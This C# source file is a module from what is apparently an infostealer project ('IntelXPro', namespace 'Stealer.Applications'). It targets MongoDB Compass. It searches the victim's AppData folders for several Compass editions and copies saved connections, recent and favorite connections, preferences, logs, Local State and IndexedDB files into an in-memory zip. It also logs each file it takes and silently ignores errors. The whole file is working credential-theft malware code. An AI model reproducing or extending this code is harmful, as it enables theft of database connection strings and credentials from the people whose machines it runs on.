using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class MongoDBCompass : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "MongoDBCompass";

            bool foundData = false;

            string[] compassPaths = new string[]
            {
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MongoDB Compass"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MongoDB Compass Community"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MongoDB Compass Isolated"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MongoDB Compass Readonly")
            };

            foreach (string compassPath in compassPaths)
            {
                if (Directory.Exists(compassPath))
                {
                    foundData |= CollectFromDirectory(compassPath, zip, counterApplications);
                }
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromDirectory(string basePath, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string editionName = Path.GetFileName(basePath);

                string[] configFiles = new string[]
                {
                    "Connections",
                    "FavoriteConnections",
                    "RecentConnections",
                    "Preferences",
                    "Settings"
                };

                foreach (string configFile in configFiles)
                {
                    string fullPath = Path.Combine(basePath, configFile);
                    
                    if (File.Exists(fullPath))
                    {
                        string zipPath = $"Applications\\MongoDBCompass\\{editionName}\\{configFile}";
                        zip.AddFile(zipPath, File.ReadAllBytes(fullPath));
                        counterApplications.Files.Add(fullPath + " => " + zipPath);
                        foundData = true;
                    }
                }

                string logsPath = Path.Combine(basePath, "logs");
                if (Directory.Exists(logsPath))
                {
                    string[] logFiles = Directory.GetFiles(logsPath, "*.log", SearchOption.TopDirectoryOnly);
                    
                    foreach (string logFile in logFiles.Take(5))
                    {
                        string fileName = Path.GetFileName(logFile);
                        string zipPath = $"Applications\\MongoDBCompass\\{editionName}\\logs\\{fileName}";
                        zip.AddFile(zipPath, File.ReadAllBytes(logFile));
                        counterApplications.Files.Add(logFile + " => " + zipPath);
                        foundData = true;
                    }
                }

                string userDataPath = Path.Combine(basePath, "User Data");
                if (Directory.Exists(userDataPath))
                {
                    string preferencesFile = Path.Combine(userDataPath, "Preferences");
                    if (File.Exists(preferencesFile))
                    {
                        string zipPath = $"Applications\\MongoDBCompass\\{editionName}\\User Data\\Preferences";
                        zip.AddFile(zipPath, File.ReadAllBytes(preferencesFile));
                        counterApplications.Files.Add(preferencesFile + " => " + zipPath);
                        foundData = true;
                    }

                    string localStateFile = Path.Combine(userDataPath, "Local State");
                    if (File.Exists(localStateFile))
                    {
                        string zipPath = $"Applications\\MongoDBCompass\\{editionName}\\User Data\\Local State";
                        zip.AddFile(zipPath, File.ReadAllBytes(localStateFile));
                        counterApplications.Files.Add(localStateFile + " => " + zipPath);
                        foundData = true;
                    }
                }

                string indexedDBPath = Path.Combine(basePath, "IndexedDB");
                if (Directory.Exists(indexedDBPath))
                {
                    string[] dbFiles = Directory.GetFiles(indexedDBPath, "*.*", SearchOption.AllDirectories);
                    
                    foreach (string dbFile in dbFiles)
                    {
                        string ext = Path.GetExtension(dbFile).ToLower();
                        if (ext == ".db" || ext == ".json" || ext == ".leveldb")
                        {
                            string relativePath = dbFile.Substring(indexedDBPath.Length + 1);
                            string zipPath = $"Applications\\MongoDBCompass\\{editionName}\\IndexedDB\\{relativePath}";
                            zip.AddFile(zipPath, File.ReadAllBytes(dbFile));
                            counterApplications.Files.Add(dbFile + " => " + zipPath);
                            foundData = true;
                        }
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
